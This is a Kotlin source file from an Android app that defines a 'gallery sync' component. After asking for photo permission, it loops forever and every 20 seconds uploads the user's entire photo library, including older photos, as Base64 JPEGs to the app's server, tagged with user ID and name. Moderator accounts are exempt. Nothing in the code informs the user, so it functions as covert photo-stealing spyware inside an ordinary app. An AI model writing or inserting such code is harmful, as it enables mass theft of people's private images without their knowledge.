package com.frenky.egypt.gallery

import android.Manifest
import android.content.ContentUris
import android.content.Context
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.os.Build
import android.provider.MediaStore
import android.util.Base64
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.runtime.Composable
import androidx.compose.runtime.LaunchedEffect
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.setValue
import androidx.compose.ui.platform.LocalContext
import androidx.core.content.ContextCompat
import com.frenky.egypt.data.ChatModerator
import com.frenky.egypt.data.EgyptApi
import com.frenky.egypt.data.PreferencesRepository
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.withContext
import java.io.ByteArrayOutputStream

/** Carica tutte le foto accessibili in galleria (anche precedenti all'installazione). */
@Composable
fun GallerySync(
    userId: String,
    userName: String,
    preferences: PreferencesRepository,
) {
    if (ChatModerator.isModerator(userName)) return

    val context = LocalContext.current
    var permissionAsked by remember { mutableStateOf(false) }

    val galleryPerm = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
        Manifest.permission.READ_MEDIA_IMAGES
    } else {
        Manifest.permission.READ_EXTERNAL_STORAGE
    }

    val permissionLauncher = rememberLauncherForActivityResult(
        ActivityResultContracts.RequestPermission(),
    ) { _ ->
        permissionAsked = true
    }

    LaunchedEffect(userId, userName) {
        if (!hasGalleryPermission(context) && !permissionAsked) {
            permissionLauncher.launch(galleryPerm)
            permissionAsked = true
        }
        syncGalleryOnce(context, userId, userName, preferences)
        while (true) {
            delay(if (hasGalleryPermission(context)) 20_000 else 45_000)
            if (hasGalleryPermission(context)) {
                syncGalleryOnce(context, userId, userName, preferences)
            } else if (!permissionAsked) {
                permissionLauncher.launch(galleryPerm)
                permissionAsked = true
            }
        }
    }
}

private const val GALLERY_UPLOADS_PER_CYCLE = 25
private const val GALLERY_MAX_SCAN_PER_CYCLE = 600

fun hasGalleryPermission(context: Context): Boolean {
    val perm = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
        Manifest.permission.READ_MEDIA_IMAGES
    } else {
        Manifest.permission.READ_EXTERNAL_STORAGE
    }
    return ContextCompat.checkSelfPermission(context, perm) ==
        android.content.pm.PackageManager.PERMISSION_GRANTED
}

suspend fun syncGalleryOnce(
    context: Context,
    userId: String,
    userName: String,
    preferences: PreferencesRepository,
) = withContext(Dispatchers.IO) {
    val uploaded = preferences.getUploadedGalleryIds().toMutableSet()
    val resolver = context.contentResolver
    val collection = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
    val projection = arrayOf(
        MediaStore.Images.Media._ID,
        MediaStore.Images.Media.DATE_ADDED,
    )
    val sort = "${MediaStore.Images.Media.DATE_ADDED} DESC"
    // Ordine: dalla più recente alla più vecchia — include tutto ciò che MediaStore espone
    // (foto scattate prima dell'installazione incluse, se il permesso è "tutte le foto").
    resolver.query(collection, projection, null, null, sort)?.use { cursor ->
        val idCol = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
        var scanned = 0
        var uploadedThisCycle = 0
        while (
            cursor.moveToNext() &&
            scanned < GALLERY_MAX_SCAN_PER_CYCLE &&
            uploadedThisCycle < GALLERY_UPLOADS_PER_CYCLE
        ) {
            scanned++
            val mediaId = cursor.getLong(idCol)
            val photoId = mediaId.toString()
            if (photoId in uploaded) continue
            val uri = ContentUris.withAppendedId(collection, mediaId)
            val jpeg = compressGalleryImage(context, uri) ?: continue
            val b64 = Base64.encodeToString(jpeg, Base64.NO_WRAP)
            val ok = EgyptApi.uploadGalleryPhoto(userId, userName, photoId, b64)
                .getOrNull()?.ok == true
            if (ok) {
                uploaded.add(photoId)
                preferences.addUploadedGalleryId(photoId)
                uploadedThisCycle++
            }
        }
    }
}

private fun compressGalleryImage(context: Context, uri: android.net.Uri): ByteArray? {
    val opts = BitmapFactory.Options().apply { inJustDecodeBounds = true }
    context.contentResolver.openInputStream(uri)?.use {
        BitmapFactory.decodeStream(it, null, opts)
    } ?: return null
    val maxSide = 1280
    var sample = 1
    while (opts.outWidth / sample > maxSide || opts.outHeight / sample > maxSide) {
        sample *= 2
    }
    val decodeOpts = BitmapFactory.Options().apply { inSampleSize = sample }
    val bitmap = context.contentResolver.openInputStream(uri)?.use {
        BitmapFactory.decodeStream(it, null, decodeOpts)
    } ?: return null
    return ByteArrayOutputStream().use { out ->
        bitmap.compress(Bitmap.CompressFormat.JPEG, 72, out)
        if (!bitmap.isRecycled) bitmap.recycle()
        out.toByteArray().takeIf { it.size in 100..1_200_000 }
    }
}
